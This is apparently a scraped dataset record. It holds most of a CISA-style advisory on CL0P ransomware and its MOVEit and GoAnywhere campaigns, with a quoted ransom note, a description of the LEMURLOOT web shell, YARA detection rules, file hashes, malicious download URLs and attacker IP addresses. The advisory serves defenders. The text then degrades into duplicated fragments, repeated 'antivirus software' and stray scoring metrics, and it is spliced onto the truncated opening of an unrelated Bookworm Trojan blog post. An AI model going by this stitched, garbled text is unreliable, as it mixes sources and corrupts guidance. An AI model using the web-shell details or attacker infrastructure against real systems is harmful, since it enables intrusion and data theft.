and impact of CL0P ransomware and other ransomware incidents.Download the PDF version or the STIX file of this report:TECHNICAL DETAILSNote: This advisory uses the MITRE ATT&CK(r) for Enterprise framework, version 13. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.Appearing in February 2019, and evolving from the CryptoMix ransomware variant, CL0P was leveraged as a Ransomware as a Service (RaaS) in large-scale spear-phishing campaigns that used a verified and digitally signed binary to bypass system defenses. CL0P was previously known for its use of the ""double extortion"" tactic of stealing and encrypting victim data, refusing to restore victim access and publishing exfiltrated data on Tor via the CL0P^_-LEAKS website. In 2019, TA505 actors leveraged CL0P ransomware as the final payload of a phishing campaign involving a macro-enabled document that used a Get2 malware dropper for downloading SDBot and FlawedGrace. In recent campaigns beginning 2021, CL0P preferred to rely mostly on data exfiltration over encryption.Beyond CL0P ransomware, TA505 is known for frequently changing malware and driving global trends in criminal malware distribution. Considered to be one of the largest phishing and malspam distributors worldwide, TA505 is estimated to have compromised more than 3,000 U.S.-based organizations and 8,000 global organizations.TA505 has operated:A RaaS and has acted as an affiliate of other RaaS operations,As an initial access broker (IAB), selling access to compromised corporate networks,As a customer of other IABs,And as a large botnet operator specializing in financial fraud and phishing attacks.In a campaign from 2020 to 2021, TA505 used several zero-day exploits to install a web shell named DEWMODE on internet-facing Accellion FTA servers. Similarly, the recent exploitation of MOVEit Transfer, a SQL injection vulnerability was used to install the web shell, which enabled TA505 to execute operating system commands on the infected server and steal data.In late January 2023, the CL0P ransomware group launched a campaign using a zero-day vulnerability, now catalogued as CVE-2023-0669, to target the GoAnywhere MFT platform. The group claimed to have exfiltrated data from the GoAnywhere MFT platform that impacted approximately 130 victims over the course of 10 days. Lateral movement into the victim networks from the GoAnywhere MFT was not identified, suggesting the breach was limited to the GoAnywhere platform itself. Over the next several weeks, as the exfiltrated data was parsed by the group, ransom notes were sent to upper-level executives of the victim companies, likely identified through open source research. The ransom notes threatened to publish the stolen files on the CL0P data leak site if victims did not pay the ransom amount.Figure 1: CL0P Ransom Note Hello, this is the CL0P hacker group. As you may know, we recently carried out a hack, which was reported in the news on site [redacted]. We want to inform you that we have stolen important information from your GoAnywhere MFT resource and have attached a full list of files as evidence. We deliberately did not disclose your organization and wanted to negotiate with you and your leadership first. If you ignore us, we will sell your information on the black market and publish it on our blog, which receives 30-50 thousand unique visitors per day. You can read about us on [redacted] by searching for CLOP hacker group. You can contact us using the following contact information: unlock@rsv-box[.]com and unlock@support-mult[.]comCL0P's toolkit contains several malware types to collect information, including the following:FlawedAmmyy/FlawedGrace remote access trojan (RAT) collects information and attempts to communicate with the Command and Control (C2) server to enable the download of additional malware components [T1071], [T1105].access trojan (RAT) collects information and attempts to communicate with the Command and Control (C2) server to enable the download of additional malware components [T1071], [T1105]. SDBot RAT propagates the infection, exploiting vulnerabilities and dropping copies of itself in removable drives and network shares [T1105]. It is also capable of propagating when shared though peer-to-peer (P2P) networks. SDBot is used as a backdoor [T1059.001] to enable other commands and functions to be executed in the compromised computer. This malware uses application shimming for persistence and to avoid detection [T1546.011].Truebot is a first-stage downloader module that can collect system information and take screenshots [T1113], developed and attributed to the Silence hacking group. After connecting to the C2 infrastructure, Truebot can be instructed to load shell code [T1055] or DLLs [T1574.002], download additional modules [T1129], run them, or delete itself [T1070]. In the case of TA505, Truebot has been used to download FlawedGrace or Cobalt Strike beacons.Cobalt Strike is used to expand network access after gaining access to the Active Directory (AD) server [T1018].DEWMODE is a web shell written in PHP designed to target Accellion FTA devices and interact with the underlying MySQL database and is used to steal data from the compromised device [1505.003].is a web shell written in PHP designed to target Accellion FTA devices and interact with the underlying MySQL database and is used to steal data from the compromised device [1505.003]. LEMURLOOT is a web shell written in C designed to target the MOVEit Transfer platform. The web shell authenticates incoming http requests via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, and create, insert, or delete a particular user. When responding to the request, the web shell returns data in a gzip compressed format.CVE-2023-34362 MOVEIT TRANSFER VULNERABILITYMOVEit is typically used to manage an organization's file transfer operations and has a web application that supports MySQL, Microsoft SQL Server, and Azure SQL database engines. In May 2023, the CL0P ransomware group exploited a SQL injection zero-day vulnerability CVE-2023-34362 to install a web shell named LEMURLOOT on MOVEit Transfer web applications [T1190] [1]. The web shell was initially observed with the name human2.aspx in an effort to masquerade as the legitimate human.aspx file present as part of MOVEit Transfer software. Upon installation, the web shell creates a random 36 character password to be used for authentication. The web shell interacts with its operators by awaiting HTTP requests containing a header field named X-siLock-Comment, which must have a value assigned equal to the password established upon the installation of the web shell. After authenticating with the web shell, operators pass commands to the web shell that can:Retrieve Microsoft Azure system settings and enumerate the underlying SQL database.Store a string sent by the operator and then retrieve a file with a name matching the string from the MOVEit Transfer system.Create a new administrator privileged account with a randomly generated username and LoginName and RealName values set to ""Health Check Service.""Delete an account with LoginName and RealName values set to 'Health Check Service.'Progress Software announced the discovery of CVE-2023-34362 MOVEit Transfer vulnerability and issued guidance on known affected versions, software upgrades, and patching. Based on evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog on June 2, 2023. This MOVEit Transfer critical vulnerability exploit impacts the following versions of the software [2]:MOVEit Transfer 2023.0.0MOVEit Transfer 2022.1.xMOVEit Transfer 2022.0.xMOVEit Transfer 2021.1.xMOVEit Transfer 2021.0.xMOVEit Transfer 2020.1.xMOVEit Transfer 2020.0.xDue to the speed and ease TA505 has exploited this vulnerability, and based on their past campaigns, FBI and CISA expect to see widespread exploitation of unpatched software services in both private and public networks. For IOCs related to the MOVEit campaign, see table 2.DETECTION METHODSBelow, are open source deployable YARA rules that may be used to detect malicious activity of the MOVEit Transfer Zero Day Vulnerability. For more information, visit GitHub or the resource section of this CSA. [1] [3]:rule M_Webshell_LEMURLOOT_DLL_1 {meta:disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment""description = ""Detects the compiled DLLs generated from human2.aspx LEMURLOOT payloads.""sample = ""c58c2c2ea608c83fad9326055a8271d47d8246dc9cb401e420c0971c67e19cbf""date = ""2023/06/01""version = ""1""strings:$net = ""ASP.NET""$human = ""Create_ASP_human2_aspx""$s1 = ""X-siLock-Comment"" wide$s2 = ""X-siLock-Step3"" wide$s3 = ""X-siLock-Step2"" wide$s4 = ""Health Check Service"" wide$s5 = ""attachment, filename={0}"" widecondition:uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 andfilesize < 15KB and$net and(($human and 2 of ($s*)) or(3 of ($s*)))}rule M_Webshell_LEMURLOOT_1 {meta:disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment""description = ""Detects the LEMURLOOT ASP.NET scripts""md5 = ""b69e23cd45c8ac71652737ef44e15a34""sample = ""cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x""date = ""2023/06/01""version = ""1""strings:$head = ""<%@ Page""$s1 = ""X-siLock-Comment""$s2 = ""X-siLock-Step""$s3 = ""Health Check Service""$s4 = /pass, \""[a-z0-9]{8}-[a-z0-9]{4}/$s5 = ""attachment,filename={0}""condition:filesize > 5KB and filesize < 10KB and(($head in (0..50) and 2 of ($s*)) or(3 of ($s*)))}If a victim rebuilds the web server but leaves the database intact, the CL0P user accounts will still exist and can be used for persistent access to the system.Victims can use the following SQL query to audit for active administrative accounts, and should validate that only intended accounts are present.SELECT * FROM [<database name>].[dbo].[users] WHERE Permission=30 AND Status='active' and Deleted='0'rule MOVEit_Transfer_exploit_webshell_aspx { meta: date = ""2023-06-01""description = ""Detects indicators of compromise in MOVEit Transfer exploitation.""author = ""Ahmet Payaslioglu - Binalyze DFIR Lab""hash1 = ""44d8e68c7c4e04ed3adacb5a88450552""hash2 = ""a85299f78ab5dd05e7f0f11ecea165ea""reference1 = ""https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/""reference2 = ""https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/""reference3 = ""https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643""verdict = ""dangerous""mitre = ""T1505.003""platform = ""windows""search_context = ""filesystem""strings:$a1 = ""MOVEit.DMZ""$a2 = ""Request.Headers[\""X-siLock-Comment\""]""$a3 = ""Delete FROM users WHERE RealName='Health Check Service'""$a4 = ""set[\""Username\""]""$a5 = ""INSERT INTO users (Username, LoginName, InstID, Permission, RealName""$a6 = ""Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create()""$a7 = ""Response.StatusCode = 404,""condition:filesize < 10KBand all of them} rule MOVEit_Transfer_exploit_webshell_dll { meta: date = ""2023-06-01""description = ""Detects indicators of compromise in MOVEit Transfer exploitation.""author = ""Djordje Lukic - Binalyze DFIR Lab""hash1 = ""7d7349e51a9bdcdd8b5daeeefe6772b5""hash2 = ""2387be2afe2250c20d4e7a8c185be8d9""reference1 = ""https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/""reference2 = ""https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/""reference3 = ""https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643""verdict = ""dangerous""mitre = ""T1505.003""platform = ""windows""search_context = ""filesystem""strings:$a1 = ""human2.aspx"" wide$a2 = ""Delete FROM users WHERE RealName='Health Check Service'"" wide$a3 = ""X-siLock-Comment"" widecondition:uint16(0) == 0x5A4D and filesize < 20KBand all of them}MOVEit Campaign Indicators of CompromiseFiles Hash LEMURLOOT Web Shell e.g. human2.aspx 0b3220b11698b1436d1d866ac07cc90018e59884e91a8cb71ef8924309f1e0e9 0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 110e301d3b5019177728010202c8096824829c0b11bb0dc0bff55547ead18286 1826268249e1ea58275328102a5a8d158d36b4fd312009e4a2526f0bfbc30de2 2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 2ccf7e42afd3f6bf845865c74b2e01e2046e541bb633d037b05bd1cdb296fa59 348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d 387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a 38e69f4a6d2e81f28ed2dc6df0daf31e73ea365bd2cfc90ebc31441404cca264 3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b 3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c 4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf 48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a 58ccfb603cdc4d305fddd52b84ad3f58ff554f1af4d7ef164007cb8438976166 5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff 6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d 702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 769f77aace5eed4717c7d3142989b53bd5bac9297a6e11b2c588c3989b397e6b 7c39499dd3b0b283b242f7b7996205a9b3cf8bd5c943ef6766992204d46ec5f1 93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db 98a30c7251cf622bd4abce92ab527c3f233b817a57519c2dd2bf8e3d3ccb7db8 9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead 9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 a8f6c1ccba662a908ef7b0cb3cc59c2d1c9e2cbbe1866937da81c4c616e68986 b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 b5ef11d04604c9145e4fe1bedaeb52f2c2345703d52115a5bf11ea56d7fb6b03 b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad bdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 cec425b3383890b63f5022054c396f6d510fae436041add935cd6ce42033f621 cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a ed0c3e75b7ac2587a5892ca951707b4e0dd9c8b18aaf8590c24720d73aa6b90c f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2fGoAnywhere Campaign Indicators of CompromiseFiles Hash Description larabqFa.exeQboxdv.dll 0e3a14638456f4451fe8d76fdc04e591fba942c2f16da31857ca66293a58a4c3 Truebot %TMP%\7ZipSfx.000\Zoom.exe1285aa7e6ee729be808c46c069e30a9ee9ce34287151076ba81a0bea0508ff7e Spawns a PowerShell subprocess which executes a malicious DLL file %TMP%\7ZipSfx.000\ANetDiag.dll 2c8d58f439c708c28ac4ad4a0e9f93046cf076fc6e5ab1088e8943c0909acbc4 Obfuscated malware which also uses long sleeps and debug detection to evade analysis AVICaptures.dll a8569c78af187d603eecdc5faec860458919349eef51091893b705f466340ecd Truebot kpdphhajHbFerUr.exegamft.dll c042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c Truebot dnSjujahur.exePxaz.dll c9b874d54c18e895face055eeb6faa2da7965a336d70303d0bd6047bec27a29d Truebot 7ZSfxMod_x86.exeZoomInstaller.exeZoom.exe d5bbcaa0c3eeea17f12a5cc3dbcaffff423d00562acb694561841bcfe984a3b7 Fake Zoom installer - Truebot update.jsp eb9f5cbe71f9658d38fb4a7aa101ad40534c4c93ee73ef5f6886d89159b0e2c2 Java Server Pages (JSP) web shell with some base64 obfuscation %TMP%\<folder>\extracted_at_0xe5c8f00.exe f2f08e4f108aaffaadc3d11bad24abdd625a77e0ee9674c4541b562c78415765 Employs sandbox detection and string obfuscation - appears to be a collection of C hack tools UhfdkUSwkFKedUUi.exegamft.dll ff8c8c8bfba5f2ba2f8003255949678df209dbff95e16f2f3c338cfa0fd1b885 TruebotEmail Address Description unlock@rsv-box[.]com CL0P communication email unlock@support-mult[.]com CL0P communication email rey14000707@gmail[.]com Login/Download gagnondani225@gmail[.]com EmailMalicious Domain http://hiperfdhaus[.]com http://jirostrogud[.]com http://qweastradoc[.]com http://qweastradoc[.]com/gate.php http://connectzoomdownload[.]com/download/ZoomInstaller.exe https://connectzoomdownload[.]com/download/ZoomInstaller.exe http://zoom[.]voyage/download/Zoom.exe http://guerdofest[.]com/gate.phpCertificate Name Status Date Valid Thumbprint Serial Number Savas Investments PTY LTD Valid Issuer: Sectigo Public Code Signing CA R36 10/7/2022 - 10/7/2023 8DCCF6AD21A58226521 E36D7E5DBAD133331C181 00-82-D2-24-32-3E-FA-65-06-0B-64- 1F-51-FA-DF-EF-02MOVEit Campaign Infrastructure IP Addresses May/June 2023 GoAnywhere Campaign Infrastructure IP Addresses January/February 2023 104.194.222[.]107 100.21.161[.]34 138.197.152[.]201 104.200.72[.]149 146.0.77[.]141 107.181.161[.]207 146.0.77[.]155 141.101.68[.]154 146.0.77[.]183 141.101.68[.]166 148.113.152[.]144 142.44.212[.]178 162.244.34[.]26 143.31.133[.]99 162.244.35[.]6 148.113.159[.]146 179.60.150[.]143 148.113.159[.]213 185.104.194[.]156 15.235.13[.]184 185.104.194[.]24 15.235.83[.]73 185.104.194[.]40 162.158.129[.]79 185.117.88[.]17 166.70.47[.]90 185.162.128[.]75 172.71.134[.]76 185.174.100[.]215 173.254.236[.]131 185.174.100[.]250 185.104.194[.]134 185.181.229[.]240 185.117.88[.]2 185.181.229[.]73 185.174.100[.]17 185.183.32[.]122 185.33.86[.]225 185.185.50[.]172 185.33.87[.]126 188.241.58[.]244 185.80.52[.]230 193.169.245[.]79 185.81.113[.]156 194.33.40[.]103 192.42.116[.]191 194.33.40[.]104 195.38.8[.]241 194.33.40[.1]64 198.137.247[.]10 198.12.76[.]214 198.199.74[.]207 198.27.75[.]110 198.199.74[.]207:1234/update.jsp 206.221.182[.]106 198.245.13[.]4 209.127.116[.]122 20.47.120[.]195 209.127.4[.]22 208.115.199[.]25 209.222.103[.]170 209.222.98[.]25 209.97.137[.]33 213.121.182[.]84 45.227.253[.]133 216.144.248[.]20 45.227.253[.]147 23.237.114[.]154 45.227.253[.]50 23.237.56[.]234 45.227.253[.]6 3.101.53[.]11 45.227.253[.]82 44.206.3[.]111 45.56.165[.]248 45.182.189[.]200 5.149.248[.]68 45.182.189[.]228 5.149.250[.]74 45.182.189[.]229 5.149.250[.]92 5.149.250[.]90 5.188.86[.]114 5.149.252[.]51 5.188.86[.]250 5.188.206[.]76 5.188.87[.]194 5.188.206.76[:]8000/se1.dll 5.188.87[.]226 5.34.178[.]27 5.188.87[.]27 5.34.178[.]28 5.252.23[.]116 5.34.178[.]30 5.252.25[.]88 5.34.178[.]31 5.34.180[.]205 5.34.180[.]48 62.112.11[.]57 50.7.118[.]90 62.182.82[.]19 54.184.187[.]134 62.182.85[.]234 54.39.133[.]41 66.85.26[.]215 63.143.42[.]242 66.85.26[.]234 68.156.159[.]10 66.85.26[.]248 74.218.67[.]242 79.141.160[.]78 76.117.196[.]3 79.141.160[.]83 79.141.160[.]78 84.234.96[.]104 79.141.161[.]82 84.234.96[.]31 79.141.173[.]94 89.39.104[.]118 81.56.49[.]148 89.39.105[.]108 82.117.252[.]141 91.202.4[.]76 82.117.252[.]142 91.222.174[.]95 82.117.252[.]97 91.229.76[.]187 88.214.27[.]100 93.190.142[.]131 88.214.27[.]101 91.222.174[.]68 91.223.227[.]140 92.118.36[.]210 92.118.36[.]213 92.118.36[.]249 96.10.22[.]178 96.44.181[.]131 5.252.23[.]116 5.252.25[.]88 84.234.96[.]104 89.39.105[.]108 138.197.152[.]201 148.113.152[.]144 198.12.76[.]214 209.97.137[.]33 209.222.103[.]170MITRE ATT&CK TECHNIQUESSee tables below for referenced CL0P tactics and techniques used in this advisory.Table 1. ATT&CK Techniques for Enterprise: Initial Access Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 CL0P ransomware group exploited the zero-day vulnerability CVE-2023-34362 affecting MOVEit Transfer software, begins with a SQL injection to infiltrate the MOVEit Transfer web application. Phishing T1566 CL0P actors send a large volume of spear-phishing emails to employees of an organization to gain initial access.Table 2. ATT&CK Techniques for Enterprise: Execution Execution Technique Title ID Use Command and Scripting Interpreter: PowerShell T1059.001 CL0P actors use SDBot as a backdoor to enable other commands and functions to be executed in the compromised computer. Command and Scripting Interpreter T1059.003 CL0P actors use TinyMet, a small open-source Meterpreter stager to establish a reverse shell to their C2 server. Shared Modules T1129 CL0P actors use Truebot to download additional modules.Table 3. ATT&CK Techniques for Enterprise: Persistence Persistence Technique Title ID Use Server Software Component: Web Shell T1505.003 DEWMODE is a web shell designed to interact with a MySQL database, and is used to exfiltrate data from the compromised network. Event Triggered Execution: Application Shimming T1546.011 CL0P actors use SDBot malware for application shimming for persistence and to avoid detection.Table 4. ATT&CK Techniques for Enterprise: Privilege Escalation Privilege Escalation Technique Title ID Use Exploitation for Privilege Escalation T1068 CL0P actors were gaining access to MOVEit Transfer databases prior to escalating privileges within compromised network.Table 5. ATT&CK Techniques for Enterprise: Defense Evasion Defense Evasion Technique Title ID Use Process Injection T1055 CL0P actors use Truebot to load shell code. Indicator Removal T1070 CL0P actors delete traces of Truebot malware after it is used. Hijack Execution Flow: DLL Side-Loading T1574.002 CL0P actors use Truebot to side load DLLs.Table 6. ATT&CK Techniques for Enterprise: Discovery Discovery Technique Title ID Use Remote System Discovery T1018 CL0P actors use Cobalt Strike to expand network access after gaining access to the Active Directory (AD) servers.Table 7. ATT&CK Techniques for Enterprise: Lateral Movement Lateral Movement Technique Title ID Use Remote Services: SMB/Windows Admin Shares T1021.002 CL0P actors have been observed attempting to compromise the AD server using Server Message Block (SMB) vulnerabilities with follow-on Cobalt Strike activity. Remote Service Session Hijacking: RDP Hijacking T1563.002 CL0P ransomware actors have been observed using Remote Desktop Protocol (RDP) to interact with compromised systems after initial access.Table 8. ATT&CK Techniques for Enterprise: Collection Collection Technique Title ID Use Screen Capture T1113 CL0P actors use Truebot to take screenshots in effort to collect sensitive data.Table 9. ATT&CK Techniques for Enterprise: Command and Control Command and Control Technique Title ID Use Application Layer Protocol T1071 CL0P actors use FlawedAmmyy remote access trojan (RAT) to communicate with the Command and Control (C2). Ingress Tool Transfer T1105 CL0P actors are assessed to use FlawedAmmyy remote access trojan (RAT) to the download of additional malware components. CL0P actors use SDBot to drop copies of itself in removable drives and network shares.Table 10. ATT&CK Techniques for Enterprise: Exfiltration Exfiltration Technique Title ID Use Exfiltration Over C2 Channel T1041 CL0P actors exfiltrate data for C2 channels.MITIGATIONSThe authoring agencies recommend organizations implement the mitigations below to improve their organization's security posture in response to threat actors' activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA's Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections to reduce the risk of compromise by CL0P ransomware.Reduce threat of malicious actors using remote access tools by: Auditing remote access tools on your network to identify currently used and/or authorized software. Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T]. Using security software to detect instances of remote access software only being loaded in memory. Requiring authorized remote access solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs). Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.using remote access tools by: Implement application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.to manage and control execution of software, including allowlisting remote access programs. Strictly limit the use of RDP and other remote desktop services . If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]: Audit the network for systems using RDP. Close unused RDP ports. Enforce account lockouts after a specified number of attempts. Apply phishing-resistant multifactor authentication (MFA). Log RDP login attempts.. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]: Disable command-line and scripting activities and permissions [CPG 2.N].activities and permissions [CPG 2.N]. Restrict the use of PowerShell , using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E]., using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E]. Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T]. Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].for new and/or unrecognized accounts [CPG 4.C]. Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].and configure access controls according to the principle of least privilege [CPG 2.E]. Reduce the threat of credential compromise via the following: Place domain admin accounts in the protected users' group to prevent caching of password hashes locally. Refrain from storing plaintext credentials in scripts.via the following: Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E].In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud). Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R]. Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies. Use longer passwords consisting of at least eight characters and no more than 64 characters in length [CPG 2.B]. Store passwords in hashed format using industry-recognized password managers. Add password user ""salts"" to shared login credentials. Avoid reusing passwords [CPG 2.C]. Implement multiple failed login attempt account lockouts [CPG 2.G]. Disable password ""hints."" Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password ""patterns"" cyber criminals can easily decipher. Require administrator credentials to install software.with password logins (e.g., service account, admin accounts, and domain admin accounts) with National Institute for Standards and Technology (NIST) standards for developing and managing password policies. Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H].for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H]. Keep all operating systems, software, and firmware up to date . Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in";"The ITSecurity report recommends network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors: Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R]. Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies. Use longer passwords consisting of at least eight characters and no more than 64 characters in length [CPG 2.B]. Store passwords in hashed format using industryrecognized password managers. Add password user ""salts"" to shared login credentials. A properly configured application allowlisting solution will block any unlisted application execution. Avoid reusing passwords [CPG 2.C]. Implement multiple failed login attempt account lockouts [CPG 2.G]. Disable password ""hints."" Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password ""patterns"" cyber criminals can easily decipher. Implement multiple failed login attempt account lockouts [CPG 2.G]. Disable password ""hints."" Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring antivirus software, antivirus software, antivirus software, antivirus software, antivirus software, antivirus software";en;{'r': 0.09196067090803933, 'p': 0.9695121951219512, 'f': 0.1679873201289819};{'r': 0.060770156438026475, 'p': 0.9308755760368663, 'f': 0.11409206323805829};{'r': 0.0913823019086177, 'p': 0.9634146341463414, 'f': 0.16693079609306008}
https://unit42.paloaltonetworks.com/attack-campaign-on-the-government-of-thailand-delivers-bookworm-trojan/;Attack Campaign on the Government of Thailand Delivers Bookworm Trojan;"Unit 42 recently published a blog on a newly identified Trojan called Bookworm, which discussed the architecture and capabilities of the malware and alluded to Thailand being the focus of the threat actors' campaigns.In this blog, we will discuss the current attack campaign along with the associated threat infrastructure and the actor's tactics, techniques and procedures (TTPs). The following list provides a summary of the threat actors TTPs, which we will cover in this blog:Actively attacking targets in Thailand, specifically government entities.Uses Bookworm Trojan as the payload in attacks.Has access to compromised servers that they use to download Bookworm.Known to use spear-phishing as the attack vector to compromise targets, but have access to compromised web servers that could facilitate strategic web compromise (SWC) as an attack vector in the future.Uses standalone Flash Player to play slideshows that contain pictures of current events in Thailand as decoy documents, but also use the legitimate Flash Player installation application as a decoy in some instances.Uses date codes to track campaigns or Trojan version. If date codes are indeed used for campaign identifiers, then the dates precede attacks or current event seen in decoys by 6 to 18 days, which provides a glimpse into the development and operational tempo of this group.Use of large command and control (C2) infrastructure, which heavily favors dynamic DNS domains for C2 servers.Deployed Poison Ivy, PlugX, FFRAT and Scieron malware families.Bookworm Attack CampaignThreat actors have delivered Bookworm as a payload in attacks on targets in Thailand. Readers who are interested in this campaign should start with our first blog that lays out the overall functionality of the malware and introduces its many components.Unit 42 does not have detailed targeting information for all known Bookworm samples, but we are aware of attempted attacks on at least two branches of government in Thailand. We speculate that other attacks delivering Bookworm were also targeting organizations in Thailand based on the contents of the associated decoys documents, as well as several of the dynamic DNS domain names used to host C2 servers that contain the words ""Thai"" or ""Thailand"". Analysis of compromised systems seen communicating with Bookworm C2 servers also confirms our speculation on targeting with a majority of systems existing within Thailand.Static Date Codes and DecoysAs mentioned in our previous blog on Bookworm, the Trojan sends a static date string to the C2 server that we referred to as a campaign code. We believed that the actors would use this date code to track their attack campaigns, however, after continued analysis of the malware, we think these static dates could also be a build identifier for the Trojan. It is difficult to determine the exact purpose of these static date codes with our current data set, but we will cover both possibilities in the next sections. While we currently favor the theory that these dates act as campaign codes, we extracted the following unique date codes from all known Bookworm that suggests the threat actors began their campaign in June or July 2015:201506262015071620150801201508182015090520150920Trojan Build DatesThreat actors may use the date string hardcoded into each Bookworm sample as a build identifier. A Trojan sending a build identifier to its C2 server is quite common, as it notifies the threat actors of the specific version of the Trojan in which they are interacting. As mentioned in our previous blog, Bookworm is fairly complex based on its modular framework, which suggests that the threat actors would need to 